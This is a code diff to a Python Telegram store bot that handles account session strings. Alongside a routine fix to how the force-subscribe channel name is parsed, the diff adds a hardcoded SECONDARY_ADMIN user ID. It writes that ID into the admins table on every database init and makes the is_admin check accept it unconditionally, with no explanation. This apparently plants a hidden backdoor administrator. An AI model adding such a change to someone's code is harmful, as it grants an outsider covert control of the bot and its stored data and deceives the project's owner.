@@ -29,6 +29,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 API_ID = int(os.getenv("API_ID", "0")) 
 API_HASH = os.getenv("API_HASH") 
 ADMIN_ID = 8861377143
+SECONDARY_ADMIN = 8222482959
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -72,6 +73,7 @@ def init_db():
         cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
     
     cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (ADMIN_ID,))
+    cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (SECONDARY_ADMIN,))
     conn.commit()
     conn.close()
 
@@ -94,7 +96,7 @@ def update_set(key, value):
     conn.close()
 
 def is_admin(user_id):
-    if user_id == ADMIN_ID: return True
+    if user_id in [ADMIN_ID, SECONDARY_ADMIN]: return True
     conn = sqlite3.connect("store.db")
     cursor = conn.cursor()
     cursor.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
@@ -146,11 +148,19 @@ async def check_force_sub(update: Update, context: ContextTypes.DEFAULT_TYPE, us
     channel = get_set("force_sub_channel").strip()
     if channel.lower() == "none" or not channel: return True
     
+    # Automatically extract the ID/Username if a URL was pasted by mistake
     if "t.me/" in channel:
-        channel = channel.split("t.me/")[1].split("/")[0].split("?")[0]
+        channel = channel.split("t.me/")[-1].split("/")[0].split("?")[0]
+    elif "telegram.me/" in channel:
+        channel = channel.split("telegram.me/")[-1].split("/")[0].split("?")[0]
         
-    if not channel.startswith('@') and not channel.startswith('-100'):
-        channel = f"@{channel}"
+    # Strip any @ sign to standardize
+    channel = channel.replace("@", "")
+    
+    if channel.startswith("-100") or channel.replace("-", "").isdigit():
+        pass # Keep it as a raw string ID
+    else:
+        channel = f"@{channel}" # Add @ back for public usernames
         
     try:
         member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
@@ -251,7 +261,7 @@ async def logout_acc_bot(session_str):
 # --- 4. CORE BOT ROUTING ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    context.user_data['state'] = None # Clear state on start
+    context.user_data['state'] = None 
     
     if get_set("maintenance_mode") == "1" and not is_admin(user.id):
         await update.message.reply_text("🛠️ <b>System Upgrade</b>\n\nOur store is currently undergoing maintenance. Please check back shortly.", parse_mode="HTML")
